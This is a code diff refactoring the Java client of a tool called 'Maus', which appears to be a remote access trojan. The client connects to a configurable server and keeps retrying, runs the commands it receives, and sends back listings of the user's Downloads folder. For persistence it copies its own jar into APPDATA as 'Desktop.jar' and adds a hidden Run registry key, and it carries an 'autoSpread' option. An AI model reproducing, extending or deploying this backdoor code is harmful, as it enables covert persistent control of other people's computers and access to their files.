@@ -3,41 +3,25 @@ package Client;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 
 public class Client {
     private static String HOST = "localhost";
     private static int PORT = 22122;
-    private static boolean debugMode = true;
-    private final String SYSTEMOS = System.getProperty("os.name");
-    private boolean isPersistent = false;
-    private boolean autoSpread = false;
-    private Socket socket;
-    private DataOutputStream dos;
-    private File directory;
-    private DataInputStream dis;
-
-    private static String getHOST() {
-        return HOST;
-    }
-
-    private static void setHOST(String HOST) {
-        Client.HOST = HOST;
-    }
-
-    private static int getPORT() {
-        return PORT;
-    }
-
-    private static void setPORT(int PORT) {
-        Client.PORT = PORT;
-    }
+    private static  boolean debugMode = true;
+    private static final String SYSTEMOS = System.getProperty("os.name");
+    private static boolean isPersistent = false;
+    private static boolean autoSpread = false;
+    private static DataOutputStream dos;
+    private static File directory;
+    private static DataInputStream dis;
 
     public static void main(String[] args) throws Exception {
         /* Load server settings and then attempt to connect to Maus. */
         Client client = new Client();
         client.loadServerSettings();
-        if (client.isPersistent) {
+        if (isPersistent) {
             client.saveClient();
         }
         client.connect();
@@ -58,7 +42,7 @@ public class Client {
         return jarFolder + "/.mauscs";
     }
 
-    public static void copyFile(File filea, File fileb) {
+    private static void copyFile(File filea, File fileb) {
         InputStream inStream;
         OutputStream outStream;
         try {
@@ -68,7 +52,7 @@ public class Client {
             byte[] buffer = new byte[1024];
 
             int length;
-            //copy the file content in bytes
+
             while ((length = inStream.read(buffer)) > 0) {
                 outStream.write(buffer, 0, length);
             }
@@ -80,33 +64,17 @@ public class Client {
         }
     }
 
-    public boolean isPersistent() {
-        return isPersistent;
-    }
-
-    public void setPersistent(boolean persistent) {
-        isPersistent = persistent;
-    }
-
-    public boolean isAutoSpread() {
-        return autoSpread;
-    }
-
-    public void setAutoSpread(boolean autoSpread) {
-        this.autoSpread = autoSpread;
-    }
-
     private void saveClient() {
         File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
-        File newClient = new File(System.getProperty("user.home") + "/Desktop.jar");
-        copyFile(client, newClient);
         if (SYSTEMOS.contains("Windows")) {
-            createPersistence(System.getProperty("user.home") + "\\Desktop.jar");
+            File newClient = new File(System.getenv("APPDATA")+ "\\Desktop.jar");
+            copyFile(client, newClient);
+            createPersistence(System.getenv("APPDATA") + "\\Desktop.jar");
         }
     }
 
     private void createPersistence(String clientPath) {
-        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Network /d " + "\"" + clientPath + "\"");
+        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
         try {
             Process proc = pb.start();
             proc.waitFor(2, TimeUnit.SECONDS);
@@ -118,7 +86,7 @@ public class Client {
 
     private void connect() throws InterruptedException {
         try {
-            socket = new Socket(getHOST(), getPORT());
+            Socket socket = new Socket(HOST, PORT);
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
             while (true) {
@@ -153,13 +121,11 @@ public class Client {
                 }
             }
         } catch (Exception e) {
-            /* Continually retry connection until established. */
             Thread.sleep(1000);
             connect();
         }
     }
 
-    /* Sends a message to the Server. */
     private void communicate(String msg) {
         try {
             dos.writeUTF(msg);
@@ -176,7 +142,6 @@ public class Client {
         }
     }
 
-    /* Execute a command using Java's Runtime. */
     private void exec(String command) {
         if (!command.equals("")) {
             try {
@@ -210,7 +175,6 @@ public class Client {
         }
     }
 
-    /* Loads the .mauscs*/
     private void loadServerSettings() throws Exception {
         String filename = getMauscs();
         Thread.sleep(100);
@@ -224,10 +188,10 @@ public class Client {
             }
             String[] settings = stringBuilder.toString().split(" ");
             if (settings.length == 4) {
-                setHOST(settings[0]);
-                setPORT(Integer.parseInt(settings[1]));
-                setPersistent(Boolean.parseBoolean(settings[2]));
-                setAutoSpread(Boolean.parseBoolean(settings[3]));
+                HOST = (settings[0]);
+                PORT = (Integer.parseInt(settings[1]));
+                isPersistent = (Boolean.parseBoolean(settings[2]));
+                autoSpread = (Boolean.parseBoolean(settings[3]));
             }
         } catch (IOException e) {
             e.printStackTrace();
@@ -250,10 +214,10 @@ public class Client {
     }
 
     private void sendFileList() {
-        if (this.directory == null) {
+        if (directory == null) {
             String directory = System.getProperty("user.home") + "/Downloads/";
-            this.directory = new File(directory);
-            this.directory.isDirectory();
+            Client.directory = new File(directory);
+            Client.directory.isDirectory();
         }
         System.out.println(directory);
         File[] files = new File(directory.getAbsolutePath()).listFiles();
